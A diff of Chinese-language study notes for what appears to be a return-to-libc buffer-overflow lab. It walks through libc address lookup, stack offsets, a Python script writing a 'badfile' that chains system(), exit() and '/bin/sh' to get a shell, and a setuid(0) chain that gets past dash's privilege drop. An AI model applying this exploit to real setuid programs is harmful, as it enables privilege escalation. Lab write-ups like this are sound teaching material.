@@ -1,3 +1,7 @@
+关于rop原理的一个讲述：
+
+https://www.ired.team/offensive-security/code-injection-process-injection/binary-exploitation/rop-chaining-return-oriented-programming#inspecting-the-stack
+
 # Environment Setup
 
 - 使用-m32标志编译为32位的程序
@@ -24,8 +28,6 @@ touch badfile
 
 ./retlib
 ```
-
-
 
 # Task 1: Finding out the Addresses of libc Functions
 
@@ -63,7 +65,7 @@ $ env | grep MYSHELL
 MYSHELL=/bin/sh
 ```
 
-编写程序./prtenv打印出`/bin/sh`字符串所在地址，注意到文件名和retlib必须都是相同字符数目
+编写程序./prtenv打印出`/bin/sh`字符串所在地址，注意到文件名和retlib必须都是相同字符数目，不然地址可能不同
 
 ```c
 #include<stdio.h>
@@ -75,25 +77,152 @@ void main(){
 }
 ```
 
-得到地址为`ffffd45d`
+得到字符串的地址为`ffffd45d`
+
+# Task 3: Launching the Attack
+
+这个任务主要矛盾是算出X Y Z的值，以及系统调用和字符串的地址
+
+运行retlib得到buffer的地址和ebp的地址，并算出0xffae1858和0xffae1840的差值，为24
+
+当然，也可以使用gdb调试得到ebp和buffer的差值
+
+```shell
+$ ./retlib 
+Address of input[] inside main():  0xffae1870
+Input size: 300
+Address of buffer[] inside bof():  0xffae1840
+Frame Pointer value inside bof():  0xffae1858
+Segmentation fault
+```
+
+返回地址相对于buffer的位置是：偏移24+4=28，这里返回地址应该替换为system的地址
+
+由于回收栈时候的leave ret操作，esp会被抬高4个字节，因此28+4+4是system函数的参数，也即是字符串的地址；28+4是system函数执行后需要执行的下一个函数，也即是exit函数
+
+顺带提一下，栈回收时候的操作：
+
+- mov %ebp，%esp 。将esp指向ebp所指，相当于回收栈分配的空间
+- pop ebp。恢复前栈指针，同时esp=esp+4，也即是指向返回地址。上面mov和pop语句可以用一个leave代替
+- ret指令相当于pop eip，因此esp=esp+4，也即是指向返回地址+4处。因此第一个参数是在return addr+8的位置
+- leave指令也即是mov %ebp，%esp + pop ebp
+
+要注意到push和pop指令都隐含着esp的改变
+
+```
+--------------------------------------------------------------
+
+`mov %ebp，%esp`
+
+     high         ┌───────────┐
+                  │           │
+                  │   arg     │
+                  ├───────────┤
+                  │           │
+                  │   exit    │
+                  ├───────────┤
+                  │           │
+                  │return addr│
+                  │           │
+                  ├───────────┤
+esp  ebp  ───► 
+---------------------------------------------------------------
+
+`pop ebp`
 
 
+    ebp  ───►
 
+                  ┌───────────┐
+                  │           │
+                  │   arg     │
+                  ├───────────┤
+                  │           │
+                  │   exit    │                  
+                  ├───────────┤
+                  │           │
+    ebp  ───►     │return addr│
+                  │           │
+                  ├───────────┤
 
+---------------------------------------------------------------
+`ret` 也即是 `pop eip`
+  
+    ebp  ───►
+
+                  ┌───────────┐
+                  │           │
+                  │   arg     │
+                  ├───────────┤
+                  │           │
+    esp  ───►     │    exit   │                  
+                  ├───────────┤
+                  │           │
+    eip  ───►     │return addr│
+                  │           │
+                  ├───────────┤
+
+          
+```
+
+攻击代码：
+
+```python
+#!/usr/bin/env python3
+import sys
+
+# Fill content with non-zero values
+content = bytearray(0xaa for i in range(300))
+
+X = 36 
+sh_addr = 0xffffd45d            # The address of "/bin/sh"
+content[X:X+4] = (sh_addr).to_bytes(4,byteorder='little')
+
+Y = 28 
+system_addr = 0xf7e11420        # The address of system()
+content[Y:Y+4] = (system_addr).to_bytes(4,byteorder='little')
+
+Z = 32
+exit_addr = 0xf7e03f80  # The address of exit()
+content[Z:Z+4] = (exit_addr).to_bytes(4,byteorder='little')
+
+# Save content to a file
+with open("badfile", "wb") as f:
+  f.write(content)
+
+```
+
+```
+$ ./retlib 
+Address of input[] inside main():  0xffffce00
+Input size: 300
+Address of buffer[] inside bof():  0xffffcdd0
+Frame Pointer value inside bof():  0xffffcde8
+# 
+```
 
 # Task 4: Defeat Shell’s countermeasure
 
-回忆一下防御机制：如果dash是在 Set-UID 进程中执行的，那么它会立即将有效用户 ID 更改为实际用户 ID，也即是会放弃其特权
+回忆一下dash的防御机制：如果dash是在 Set-UID 进程中执行的，那么它会立即将有效用户 ID 更改为实际用户 ID，也即是会放弃其特权
 
-之前我们手动将sh指向zsh，这个任务中我们需要
-
-
+之前我们手动将sh指向zsh，这个任务中我们需要通过`sudo ln -sf /bin/dash /bin/sh`将sh指向dash，之后攻破dash的防御机制
 
 
 
+setuid的地址：0xf7e98e30
 
+system地址：0xf7e11420
 
+/bin/sh字符串的地址：ffffd45d
 
+对栈帧进行覆盖：
+
+```
+/bin/sh字符串的地址，也即是system()函数的参数
+0，也即是setuid函数的参数
+system()的地址
+setuid()的地址
+```
 
 
 
